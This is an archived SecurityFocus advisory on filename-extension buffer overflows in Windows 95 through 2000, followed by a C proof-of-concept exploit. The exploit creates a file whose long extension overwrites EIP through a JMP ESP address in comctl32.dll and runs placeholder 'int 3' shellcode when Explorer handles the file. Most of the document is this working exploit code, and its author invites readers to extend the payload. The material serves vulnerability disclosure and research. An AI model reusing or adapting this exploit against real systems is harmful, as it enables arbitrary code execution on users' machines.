source: http://www.securityfocus.com/bid/1259/info

Windows 95, 98, NT and 2000 suffer from a number of related buffer overflows that can result in a crash if a filename with an extension longer than 128 characters is accessed. Although arbitrary code could be executed via this manner, it would have to composed of valid filename character values only.

File extensions of this size cannot be created within Windows 95, 98 or NT. A batch file executed from the command interpreter can accomplish this in a manner similar to the example in Securax advisory SA-02, linked to in the credit section.

In Windows 2000, long extensions can be created with Explorer. The file will display properly, however if a cut and paste operation is attempted Explorer crashes and EIP is overwritten, making arbitrary code executable at the security level of the user. 

// Written by Laurent Eschenauer <Laurent.E@mail.com>
//
// This exploit is a follow up to Securax advisory posted on Vuln-dev scx-sa-02 by <zoachien@securax.org>
// I tested it with explorer.exe 4.72.3110.1
// In the sploit, i use a JMP ESP (FF E4) in comctl32.dll version 5.81
//
// I just stuffed an "int 3" in the shellcode, doing more is going to be tricky since
// we have a limited number of bytes for the code (about 50) and you have a lot of bad bytes
// since it has to be a filename....
//
// Have fun playing with this,
// If you do anything usefull with this one, please send me a copy and share it on vuln-dev (securityfocus.com)
//
// laurent. [kooka]

#include <stdio.h>

#define PATH "d:\\exploit" //Don't forget to change this
                           //put the exploit in a dir so it's easy to
                           //delete it !

main(int argc, char *argv[])
{
	char command[1024];
	char exploit[256];

	FILE *hack;
	int i;

	// let's fill the sploit !

    char flag = 'a';
	char fill = 'A';

	for (i=0;i<240;i+=4) //A little trick to easily find what is where in memory.
	{
		exploit[i]=flag;
		exploit[i+1]=fill;
		exploit[i+2]=fill+1;
		exploit[i+3]=fill+2;

		if (++flag=='z')
		{
			flag='a';
			++fill;
		}

	}

	exploit[240]=0x00; //240 bytes is the max, at least on my config.

	//EAX - We control it, but who cares ?
	exploit[127]=(char) 0x50;
	exploit[128]=(char) 0x50;
	exploit[129]=(char) 0x50;
	exploit[130]=(char) 0x50;

	//EBP Nothing cool to do with this one ?
	exploit[135]=(char) 0x60;
	exploit[136]=(char) 0x60;
	exploit[137]=(char) 0x60;
	exploit[138]=(char) 0x60;

	//EIP I use a JMP ESP in comctl32.dll

	exploit[139]=(char) 0x77;
	exploit[140]=(char) 0xAD;
	exploit[141]=(char) 0xB9;
	exploit[142]=(char) 0xBF;
	
	//Shellcode I didn't try anyhting else...work in progress

	
	exploit[163]=(char) 0xCC;
	exploit[164]=(char) 0xCC;
	exploit[165]=(char) 0xCC;

	// Let's do it !

	sprintf(command,"%s\\AAAA.%s",PATH,exploit);

	hack=fopen(command,"w");
	if (hack==NULL)
	{
		printf("Error creating file, sorry !\n");
	}
	else
		fclose(hack);
		// Cool, just click the file and you'll smash the stack !
}
/*                    www.hack.co.za                    */